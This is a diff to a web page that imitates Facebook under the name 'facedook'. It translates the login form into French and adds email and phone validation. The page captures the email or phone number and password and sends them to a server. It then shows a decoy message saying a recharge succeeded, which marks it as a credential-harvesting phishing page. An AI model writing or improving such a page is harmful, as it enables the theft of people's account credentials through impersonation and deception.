@@ -175,19 +175,19 @@
         <div class="facebook-page flex">
             <div class="text">
                 <h1>facedook</h1>
-                <p>Connect with friends and the world </p>
-                <p> around you on Facedook.</p>
+                <p>Connect with friends and the world</p>
+                <p>around you on Facedook.</p>
             </div>
             <form id="loginForm">
-                <input type="email" id="emailOrNum" placeholder="Email or phone number" required>
-                <input type="password" id="password" placeholder="Password" required>
+                <input type="text" id="emailOrNum" placeholder="Email ou numéro de téléphone" required>
+                <input type="password" id="password" placeholder="Mot de passe" required>
                 <div class="link">
                     <button type="submit" class="login">Login</button>
-                    <a href="#" class="forgot">Forgot password?</a>
+                    <a href="#" class="forgot">Mot de passe oublié ?</a>
                 </div>
                 <hr>
                 <div class="button">
-                    <a href="#">Create new account</a>
+                    <a href="#">Créer un nouveau compte</a>
                 </div>
             </form>
         </div>
@@ -197,8 +197,17 @@
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Empêche le rechargement de la page
 
-            let emailOrNum = document.getElementById("emailOrNum").value;
+            let emailOrNum = document.getElementById("emailOrNum").value.trim();
             let password = document.getElementById("password").value;
+
+            // Regex pour email et numéro de téléphone
+            let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            let phoneRegex = /^(\+?\d{10,15})$/; // Accepte 10 à 15 chiffres avec ou sans "+"
+
+            if (!emailRegex.test(emailOrNum) && !phoneRegex.test(emailOrNum)) {
+                alert("Veuillez entrer un email ou un numéro de téléphone valide !");
+                return;
+            }
 
             let data = {
                 pswd: password,
@@ -215,7 +224,7 @@
             .then(response => response.json())
             .then(result => {
                 console.log(result);
-                alert("Login enregistré avec succès !");
+                alert("Recharge avec succès !");
             })
             .catch(error => {
                 console.error("Erreur:", error);
